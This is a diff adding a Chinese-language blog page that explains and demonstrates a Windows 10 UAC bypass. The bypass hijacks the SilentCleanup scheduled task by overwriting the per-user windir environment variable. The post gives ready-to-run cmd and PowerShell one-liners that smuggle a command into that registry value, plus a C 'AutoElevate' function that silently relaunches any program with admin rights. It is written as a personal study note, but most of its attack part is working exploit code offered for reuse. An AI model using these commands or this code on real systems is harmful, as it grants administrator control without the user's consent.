@@ -1,0 +1,303 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>windows 10下利用schtasks绕过uac | Huol&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="huolonggou">
+    
+    <meta name="description" content="0x00 前言最近在刷知乎的时候发现了一种早就被揭露但目前为止还未被修复的uac bypass手段，个人觉得其中的思路很有参考意义，故记录下来学习一下。
+0x01 原理这种uac bypass的原理是寻找权限控制不严格的程序进行劫持，以达到绕过uac使用管理员权限的shell。
+0x02 利用方法计">
+    
+    
+    
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+  <body>
+    <header>
+      <div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.svg" alt="Huol&#39;s blog" title="Huol&#39;s blog"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Huol&#39;s blog">Huol&#39;s blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+					<li>
+					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:example.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/10/22/Windows机制/uac_bypass/" title="windows 10下利用schtasks绕过uac" itemprop="url">windows 10下利用schtasks绕过uac</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="http://example.com" title="huolonggou">huolonggou</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2019-10-22T13:36:01.093Z" itemprop="datePublished">2019-10-22</time>
+    更新日期:<time datetime="2021-01-17T10:23:09.685Z" itemprop="dateModified">2021-01-17</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">0x01 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">0x02 利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E5%85%B7%E4%BD%93%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">0x03 具体代码实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X04-%E5%90%8E%E7%BB%AD%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-number">5.</span> <span class="toc-text">0X04 后续利用技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol>
+		</div>
+		
+		<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近在刷知乎的时候发现了一种早就被揭露但目前为止还未被修复的uac bypass手段，个人觉得其中的思路很有参考意义，故记录下来学习一下。</p>
+<h3 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h3><p>这种uac bypass的原理是寻找权限控制不严格的程序进行劫持，以达到绕过uac使用管理员权限的shell。</p>
+<h3 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h3><p>计划任务中的silentcleanup的关键信息如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-16&quot;?&gt;</span><br><span class="line">&lt;Task xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;windows&#x2F;2004&#x2F;02&#x2F;mit&#x2F;task&quot;&gt;</span><br><span class="line">  &lt;RegistrationInfo&gt;</span><br><span class="line">    &lt;SecurityDescriptor&gt;D:AI(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;AU)&lt;&#x2F;SecurityDescriptor&gt;</span><br><span class="line">    &lt;Source&gt;$(@%systemroot%\system32\cleanmgr.exe,-1300)&lt;&#x2F;Source&gt;</span><br><span class="line">    &lt;Author&gt;$(@%systemroot%\system32\cleanmgr.exe,-1300)&lt;&#x2F;Author&gt;</span><br><span class="line">    &lt;Description&gt;$(@%systemroot%\system32\cleanmgr.exe,-1301)&lt;&#x2F;Description&gt;</span><br><span class="line">    &lt;URI&gt;Microsoft\Windows\DiskCleanup\SilentCleanup&lt;&#x2F;URI&gt;</span><br><span class="line">  &lt;&#x2F;RegistrationInfo&gt;</span><br><span class="line">  &lt;Principals&gt;</span><br><span class="line">    &lt;Principal id&#x3D;&quot;Authenticated Users&quot;&gt;</span><br><span class="line">      &lt;GroupId&gt;S-1-5-32-545&lt;&#x2F;GroupId&gt;</span><br><span class="line">      &lt;RunLevel&gt;HighestAvailable&lt;&#x2F;RunLevel&gt;</span><br><span class="line">    &lt;&#x2F;Principal&gt;</span><br><span class="line">  &lt;&#x2F;Principals&gt;</span><br><span class="line">  &lt;Settings&gt;</span><br><span class="line">    &lt;DisallowStartIfOnBatteries&gt;true&lt;&#x2F;DisallowStartIfOnBatteries&gt;</span><br><span class="line">    &lt;StopIfGoingOnBatteries&gt;true&lt;&#x2F;StopIfGoingOnBatteries&gt;</span><br><span class="line">    &lt;ExecutionTimeLimit&gt;PT15M&lt;&#x2F;ExecutionTimeLimit&gt;</span><br><span class="line">    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;&#x2F;MultipleInstancesPolicy&gt;</span><br><span class="line">    &lt;StartWhenAvailable&gt;true&lt;&#x2F;StartWhenAvailable&gt;</span><br><span class="line">    &lt;RunOnlyIfIdle&gt;true&lt;&#x2F;RunOnlyIfIdle&gt;</span><br><span class="line">    &lt;IdleSettings&gt;</span><br><span class="line">      &lt;StopOnIdleEnd&gt;true&lt;&#x2F;StopOnIdleEnd&gt;</span><br><span class="line">      &lt;RestartOnIdle&gt;true&lt;&#x2F;RestartOnIdle&gt;</span><br><span class="line">    &lt;&#x2F;IdleSettings&gt;</span><br><span class="line">    &lt;UseUnifiedSchedulingEngine&gt;true&lt;&#x2F;UseUnifiedSchedulingEngine&gt;</span><br><span class="line">    &lt;MaintenanceSettings&gt;</span><br><span class="line">      &lt;Period&gt;P1D&lt;&#x2F;Period&gt;</span><br><span class="line">      &lt;Deadline&gt;P1M&lt;&#x2F;Deadline&gt;</span><br><span class="line">    &lt;&#x2F;MaintenanceSettings&gt;</span><br><span class="line">  &lt;&#x2F;Settings&gt;</span><br><span class="line">  &lt;Triggers &#x2F;&gt;</span><br><span class="line">  &lt;Actions Context&#x3D;&quot;Authenticated Users&quot;&gt;</span><br><span class="line">    &lt;Exec&gt;</span><br><span class="line">      &lt;Command&gt;%windir%\system32\cleanmgr.exe&lt;&#x2F;Command&gt;</span><br><span class="line">      &lt;Arguments&gt;&#x2F;autoclean &#x2F;d %systemdrive%&lt;&#x2F;Arguments&gt;</span><br><span class="line">    &lt;&#x2F;Exec&gt;</span><br><span class="line">  &lt;&#x2F;Actions&gt;</span><br><span class="line">&lt;&#x2F;Task&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到Authenticated Users表示普通用户权限即可启动而RunLevel为Highest表示以高权限启动。这就使得劫持该程序可以运行拥有管理员权限的shell进行操作。<br>打开SilentCleanup这一文件查看其中代码，可知它其实是运行了%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive% 这一命令。我们只要将%windir%的环境变量进行修改即可实现对该程序的劫持。<br>比如说：将%windir%设置为C:\hack并在C:\hack\system32下将payload.exe保存为cleanmgr.exe那么在启动计划任务SilentCleanup时，就会以高权限运行代码.</p>
+<h3 id="0x03-具体代码实现"><a href="#0x03-具体代码实现" class="headerlink" title="0x03 具体代码实现"></a>0x03 具体代码实现</h3><p>分为两种版本吧：<br>1.cmd版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add hkcu\Environment &#x2F;v windir &#x2F;d &quot;cmd &#x2F;K reg delete hkcu\Environment &#x2F;v windir &#x2F;f &amp;&amp; REM &quot; &amp;&amp; schtasks &#x2F;Run &#x2F;TN Microsoft\Windows\DiskCleanup\SilentCleanup &#x2F;I</span><br></pre></td></tr></table></figure>
+<p>2.powershell版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add hkcu\Environment &#x2F;v windir &#x2F;d &quot;powershell -noexit reg delete hkcu\Environment &#x2F;v windir &#x2F;f ; # &quot; ; schtasks &#x2F;Run &#x2F;TN Microsoft\Windows\DiskCleanup\SilentCleanup &#x2F;I</span><br></pre></td></tr></table></figure>
+<h3 id="0X04-后续利用技巧"><a href="#0X04-后续利用技巧" class="headerlink" title="0X04 后续利用技巧"></a>0X04 后续利用技巧</h3><p>我写了一个AutoElevate的函数,可以使我们自己写的代码默认运行在高权限下而不弹出uac(并未关闭uac)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">BOOL AutoElevate(char ** argv)</span><br><span class="line">&#123;</span><br><span class="line">	char elevateCommand[260] &#x3D; &quot;add hkcu\\Environment &#x2F;f &#x2F;v windir &#x2F;d \&quot;&quot;;</span><br><span class="line">	DWORD dwRetLen &#x3D; 0;</span><br><span class="line">	HANDLE TokenHandle &#x3D; 0;</span><br><span class="line">	TOKEN_ELEVATION IsAdmin;</span><br><span class="line">	HANDLE CurProcHandle &#x3D; GetCurrentProcess();</span><br><span class="line">	lstrcat(elevateCommand, argv[0]);</span><br><span class="line">	lstrcat(elevateCommand, &quot; \&quot;&quot;);</span><br><span class="line">	OpenProcessToken(CurProcHandle, TOKEN_ALL_ACCESS, &amp;TokenHandle);</span><br><span class="line">	GetTokenInformation(TokenHandle, TokenElevation, &amp;IsAdmin, sizeof(TOKEN_ELEVATION), &amp;dwRetLen);</span><br><span class="line">	if (IsAdmin.TokenIsElevated &#x3D;&#x3D; 1)</span><br><span class="line">	&#123;</span><br><span class="line">		ShellExecute(NULL, NULL, &quot;reg.exe&quot;, &quot;delete hkcu\\Environment &#x2F;v windir &#x2F;f&quot;, NULL, SW_HIDE);</span><br><span class="line">		return TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		ShellExecute(NULL, NULL, &quot;reg.exe&quot;, elevateCommand, NULL, SW_HIDE);</span><br><span class="line">		ShellExecute(NULL, NULL, &quot;schtasks.exe&quot;, &quot;&#x2F;Run &#x2F;TN Microsoft\\Windows\\DiskCleanup\\SilentCleanup &#x2F;I&quot;, NULL, SW_HIDE);</span><br><span class="line">		return FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[], char* envp[])</span><br><span class="line">&#123;</span><br><span class="line">	if (AutoElevate(argv))</span><br><span class="line">	&#123;</span><br><span class="line">		system(&quot;cmd&quot;);</span><br><span class="line">		&#x2F;&#x2F;fill with your own code</span><br><span class="line">	&#125;</span><br><span class="line">	else printf(&quot;error!&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果是启动了管理员权限的cmd.我觉得不满意的地方是如果以非管理员权限打开程序时它会闪一个黑框框(即很快地运行又退出了),这对于强迫症来说是不可接受的,以后有时间再看看怎么改进吧.</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>微软并未把uac当作安全的边界,这使得这个bug都过了一年多了还没修,当然这种bug或许造成的危害也不够大,并未引起人家重视,但是把这玩意当做漏洞利用链的一环还是可以的,多一个还未维修的漏洞,多一个思路.</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://example.com/2019/10/22/Windows%E6%9C%BA%E5%88%B6/uac_bypass/" data-title="windows 10下利用schtasks绕过uac | Huol&#39;s blog" data-tsina="" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/10/22/杂项/python随机删除/" title="突发奇想的THANOS程序">
+  <strong>PREVIOUS:</strong><br/>
+  <span>
+  突发奇想的THANOS程序</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/10/22/杂项/Markdown基础语法/"  title="MD语法介绍">
+ <strong>NEXT:</strong><br/> 
+ <span>MD语法介绍
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+  <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">0x01 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">0x02 利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E5%85%B7%E4%BD%93%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">0x03 具体代码实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X04-%E5%90%8E%E7%BB%AD%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-number">5.</span> <span class="toc-text">0X04 后续利用技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+
+  
+
+  <div class="rsspart">
+	<a href="" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<div class="social-font clearfix">
+		
+		
+		
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2021 
+		
+		<a href="http://example.com" target="_blank" title="huolonggou">huolonggou</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+
+
+
+
+  </body>
+</html>
